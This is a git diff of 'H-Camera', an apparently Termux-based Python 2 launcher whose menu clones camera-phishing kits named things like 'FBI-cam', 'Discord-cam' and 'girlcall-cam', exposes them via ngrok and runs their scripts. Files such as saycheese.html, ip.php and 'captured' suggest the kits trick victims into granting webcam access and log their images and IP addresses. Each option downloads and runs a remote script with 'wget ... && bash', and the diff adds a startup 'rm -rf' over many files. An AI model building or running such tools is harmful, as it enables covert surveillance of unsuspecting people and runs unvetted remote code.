@@ -7,8 +7,13 @@ from optparse import OptionParser
 import socket,threading,logging,urllib
 from urllib import urlopen, urlencode
 from re import search
-##
-
+os.system('rm -rf  extract.sh  Hack.sh Web.html saved.ip.txt getid Custom.html LICENSE README.md captured copy.sh extract.sh  saycheese.html index.php fix-ar-ngrok  index2.html ip.php post.php ngrok template.php index.html jmaxopcam.sh 01010cam Test Discord-cam FBI-cam senfcall-cam girlcall-cam')
+os.system('mkdir ~/girlcall-cam')
+os.system('mkdir ~/Test')
+os.system('mkdir ~/senfcall-cam')
+os.system('mkdir ~/FBI-cam')
+os.system('mkdir ~/01010cam')
+os.system('mkdir ~/Discord-cam')
 #colors
 g='\033[1;32m'
 p='\033[1;35m'
@@ -72,6 +77,9 @@ def sem_2():
  print cyan+'''        ymmdsyyyssso/::-:/+yNd/`     /dNNdyhhhhhshdmmmmmNMMm`       '''
  time.sleep( 0.01)
  print cyan+'''       +mmmhosyyyys::+shdmNNd:`.-    ::sdddhddddhhdmmmmmNMN/        '''
+
+ print ""
+ print ""
  time.sleep( 0.01)
  print cyan+'''       oNmmhyyyyhdhhhdhhs/+---``-` ``/.`-.:`:+odh+sydmNMNy-         '''
  time.sleep( 0.01)
@@ -1087,7 +1095,7 @@ def gg(t):
         sys.stdout.write(txt)
         sys.stdout.flush()
         time.sleep(9. / 10000)
-f = "         __ \033[1;32m [\033[1;33m20\033[1;32m] Follow my channel {\033[1;31mInstagram\033[1;32m}        "
+f = "         __ \033[1;32m [\033[1;33m20\033[1;32m] Follow my account {\033[1;31mInstagram\033[1;32m}        "
 y = "          __  \033[1;32m[\033[1;33m30\033[1;32m] Continue my account {\033[1;34mTikTok\033[1;32m}      "
 h = "  \033[1;33m[\033[1;32m*\033[1;33m] Welcome to my tool {\033[1;36mH-Camera\033[1;33m} Programmer [\033[1;32mMrAli\033[1;33m] "
 def android():
@@ -1184,19 +1192,19 @@ def OpEn():
   os.system('cp $PREFIX/bin/ngrok ~/H-Camera/01010cam')
   os.system('mv ~/H-Camera/01010cam/Custom.html ~/H-Camera/01010cam/LICENSE ~/H-Camera/extrach.sh ~/H-Camera/01010cam/saycheese.html ~/H-Camera/01010cam/README.md ~/H-Camera/01010cam/Web.html ~/H-Camera/01010cam/captured ~/H-Camera/01010cam/copy.sh ~/H-Camera/01010cam/index.php ~/H-Camera/01010cam/Hack.sh ~/H-Camera/01010cam/ip.php ~/H-Camera/01010cam/post.php ~/H-Camera/01010cam/ngrok ~/H-Camera/01010cam/template.php ~/H-Camera/01010cam/index2.html ~/H-Camera/01010cam/index.html ~/H-Camera/01010cam/jmaxopcam.sh ~/H-Camera/')
 #  os.system('mv /root/H-Camera/Custom.html /root/Dark.soul/WishFish/LICENSE /root/Dark.soul/WishFish/README.md /root/Dark.soul/WishFish/captured mv /root/Dark.soul/WishFish/copy.sh /root/Dark.soul/copy.sh /root/Dark.soul/WishFish/index.php /root/Dark.soul/WishFish/index2.html /root/Dark.soul/WishFish/ip.php /root/Dark.soul/WishFish/post.php /root/Dark.soul/WishFish/ngrok /root/Dark.soul/WishFish/template.php /root/Dark.soul/WishFish/wishfish.html /root/Dark.soul/WishFish/wishfish.sh /root/Dark.soul/')
-  os.system('bash jmaxopcam.sh')
+  os.system('bash ~/H-Camera/jmaxopcam.sh')
  elif enter == "2" or enter == "YouThube Web" or enter == "02":
   os.system('clear')
   print '\n####Install YouTube Web'
 # os.system('apt update && apt upgrade -y')
   os.system('apt install wget -y')
 #  os.system('git clone https://github.com/MrAli-s/01010cam.git')
-  os.system('rm -rf  extract.sh  Hack.sh Web.html saved.ip.txt getid Custom.html LICENSE README.md captured copy.sh extract.sh  saycheese.html index.php fix-ar-ngrok  index2.html ip.php post.php ngrok template.php index.html jmaxopcam.sh 01010cam')
+#  os.system('rm -rf  extract.sh  Hack.sh Web.html saved.ip.txt getid Custom.html LICENSE README.md captured copy.sh extract.sh  saycheese.html index.php fix-ar-ngrok  index2.html ip.php post.php ngrok template.php index.html jmaxopcam.sh 01010cam')
   os.system('git clone https://github.com/AkanVb/Test.git')
   os.system('wget https://raw.githubusercontent.com/Cesar-Hack-Gray/release-download/master/fix-ar-ngrok && bash fix-ar-ngrok')
   os.system('cp $PREFIX/bin/ngrok ~/H-Camera/Test')
   os.system('mv ~/H-Camera/Test/Custom.html ~/H-Camera/Test/LICENSE ~/H-Camera/Test/extrach.sh ~/H-Camera/Test/saycheese.html ~/H-Camera/Test/README.md ~/H-Camera/Test/Web.html ~/H-Camera/Test/captured ~/H-Camera/Test/copy.sh ~/H-Camera/Test/index.php ~/H-Camera/Test/Hack.sh ~/H-Camera/Test/ip.php ~/H-Camera/Test/post.php ~/H-Camera/Test/ngrok ~/H-Camera/Test/template.php ~/H-Camera/Test/index2.html ~/H-Camera/Test/index.html ~/H-Camera/Test/jmaxopcam.sh ~/H-Camera/')
-  os.system('bash jmaxopcam.sh')
+  os.system('bash ~/H-Camera/jmaxopcam.sh')
  elif enter == "3" or enter == 'FBI Web' or enter == "03":
   os.system('clear')
   print '\n####Install FBI Web'
@@ -1207,8 +1215,8 @@ def OpEn():
   os.system('git clone https://github.com/MrAli-s/FBI-cam.git')
   os.system('wget https://raw.githubusercontent.com/Cesar-Hack-Gray/release-download/master/fix-ar-ngrok && bash fix-ar-ngrok')
   os.system('cp $PREFIX/bin/ngrok ~/H-Camera/FBI-cam')
-  os.system('mv ~/H-Camera/FBI-cam/Custom.html ~/H-Camera/FBI-cam/LICENSE ~/H-Camera/FBI-cam/extrach.sh ~/H-Camera/Test/saycheese.html ~/H-Camera/Test/README.md ~/H-Camera/Test/Web.html ~/H-Camera/Test/captured ~/H-Camera/Test/copy.sh ~/H-Camera/Test/index.php ~/H-Camera/Test/Hack.sh ~/H-Camera/Test/ip.php ~/H-Camera/Test/post.php ~/H-Camera/Test/ngrok ~/H-Camera/Test/template.php ~/H-Camera/Test/index2.html ~/H-Camera/Test/index.html ~/H-Camera/Test/jmaxopcam.sh ~/H-Camera/')
-  os.system('bash jmaxopcam.sh')
+  os.system('mv ~/H-Camera/FBI-cam/Custom.html ~/H-Camera/FBI-cam/LICENSE ~/H-Camera/FBI-cam/extrach.sh ~/H-Camera/FBI-cam/saycheese.html ~/H-Camera/FBI-cam/README.md ~/H-Camera/FBI-cam/Web.html ~/H-Camera/FBI-cam/captured ~/H-Camera/FBI-cam/copy.sh ~/H-Camera/FBI-cam/index.php ~/H-Camera/FBI-cam/Hack.sh ~/H-Camera/FBI-cam/ip.php ~/H-Camera/FBI-cam/post.php ~/H-Camera/FBI-cam/ngrok ~/H-Camera/FBI-cam/template.php ~/H-Camera/FBI-cam/index2.html ~/H-Camera/FBI-cam/index.html ~/H-Camera/FBI-cam/jmaxopcam.sh ~/H-Camera/')
+  os.system('bash ~/H-Camera/jmaxopcam.sh')
 
  elif enter == "4" or enter == 'senfcall Web' or enter == "04":
   os.system('clear')
@@ -1221,7 +1229,7 @@ def OpEn():
   os.system('wget https://raw.githubusercontent.com/Cesar-Hack-Gray/release-download/master/fix-ar-ngrok && bash fix-ar-ngrok')
   os.system('cp $PREFIX/bin/ngrok ~/H-Camera/senfcall-cam')
   os.system('mv ~/H-Camera/senfcall-cam/Custom.html ~/H-Camera/senfcall-cam/LICENSE ~/H-Camera/senfcall-cam/extrach.sh ~/H-Camera/senfcall-cam/saycheese.html ~/H-Camera/senfcall-cam/README.md ~/H-Camera/senfcall-cam/Web.html ~/H-Camera/senfcall-cam/captured ~/H-Camera/senfcall-cam/copy.sh ~/H-Camera/senfcall-cam/index.php ~/H-Camera/senfcall-cam/Hack.sh ~/H-Camera/senfcall-cam/ip.php ~/H-Camera/senfcall-cam/post.php ~/H-Camera/senfcall-cam/ngrok ~/H-Camera/senfcall-cam/template.php ~/H-Camera/senfcall-cam/index2.html ~/H-Camera/senfcall-cam/index.html ~/H-Camera/senfcall-cam/jmaxopcam.sh ~/H-Camera/')
-  os.system('bash Hack.sh')
+  os.system('bash ~/H-Camera/Hack.sh')
 
  elif enter == "5" or enter == 'Girlcam Web' or enter == "05":
   os.system('clear')
@@ -1234,7 +1242,7 @@ def OpEn():
   os.system('wget https://raw.githubusercontent.com/Cesar-Hack-Gray/release-download/master/fix-ar-ngrok && bash fix-ar-ngrok')
   os.system('cp $PREFIX/bin/ngrok ~/H-Camera/girlcall-cam')
   os.system('mv ~/H-Camera/girlcall-cam/Custom.html ~/H-Camera/girlcall-cam/LICENSE ~/H-Camera/girlcall-cam/extrach.sh ~/H-Camera/girlcall-cam/saycheese.html ~/H-Camera/girlcall-cam/README.md ~/H-Camera/girlcall-cam/Web.html ~/H-Camera/girlcall-cam/captured ~/H-Camera/girlcall-cam/copy.sh ~/H-Camera/girlcall-cam/index.php ~/H-Camera/girlcall-cam/Hack.sh ~/H-Camera/girlcall-cam/ip.php ~/H-Camera/girlcall-cam/post.php ~/H-Camera/girlcall-cam/ngrok ~/H-Camera/girlcall-cam/template.php ~/H-Camera/girlcall-cam/index2.html ~/H-Camera/girlcall-cam/index.html ~/H-Camera/girlcall-cam/jmaxopcam.sh ~/H-Camera/')
-  os.system('bash jmaxopcam.sh')
+  os.system('bash ~/H-Camera/jmaxopcam.sh')
  elif enter == "6" or enter == 'Discord Web' or enter == "06":
   os.system('clear')
   print '\n####Install Discord Web'
@@ -1246,7 +1254,7 @@ def OpEn():
   os.system('wget https://raw.githubusercontent.com/Cesar-Hack-Gray/release-download/master/fix-ar-ngrok && bash fix-ar-ngrok')
   os.system('cp $PREFIX/bin/ngrok ~/H-Camera/Discord-cam')
   os.system('mv ~/H-Camera/Discord-cam/Custom.html ~/H-Camera/Discord-cam/LICENSE ~/H-Camera/Discord-cam/extrach.sh ~/H-Camera/Discord-cam/saycheese.html ~/H-Camera/Discord-cam/README.md ~/H-Camera/Discord-cam/Web.html ~/H-Camera/Discord-cam/captured ~/H-Camera/Discord-cam/copy.sh ~/H-Camera/Discord-cam/index.php ~/H-Camera/Discord-cam/Hack.sh ~/H-Camera/Discord-cam/ip.php ~/H-Camera/Discord-cam/post.php ~/H-Camera/Discord-cam/ngrok ~/H-Camera/Discord-cam/template.php ~/H-Camera/Discord-cam/index2.html ~/H-Camera/Discord-cam/index.html ~/H-Camera/Discord-cam/jmaxopcam.sh ~/H-Camera/')
-  os.system('bash jmaxopcam.sh')
+  os.system('bash ~/H-Camera/jmaxopcam.sh')
 
  elif enter == "90" or enter == 'help':
   help()
@@ -1254,7 +1262,7 @@ def OpEn():
   up_date()
  elif enter == "00" or enter == 'exit' or enter == "0" or enter == "quit":
   exit()
- elif enter == "30" or enter == 'tiktok':
+ elif enter == "20" or enter == 'tiktok':
   print ""
   time.sleep(2)
   print cyan+'  {'+blue+'MrAli'+cyan+'}--------{'+blue+'https://vm.tiktok.com/ZSJMXrAhv'+cyan+'}'
@@ -1262,7 +1270,7 @@ def OpEn():
   webbrowser.open_new('https://vm.tiktok.com/ZSJMXrAhv')
   os.system('termux-open https://vm.tiktok.com/ZSJMXrAhv')
   OpEn()
- elif enter == "20" or enter == "instagram":
+ elif enter == "30" or enter == "instagram":
   print ""
   time.sleep(2)
   print cyan+'  {'+blue+'MrAli'+cyan+'}--------{'+blue+'https://www.instagram.com/i._dont_._care'+cyan+'}'
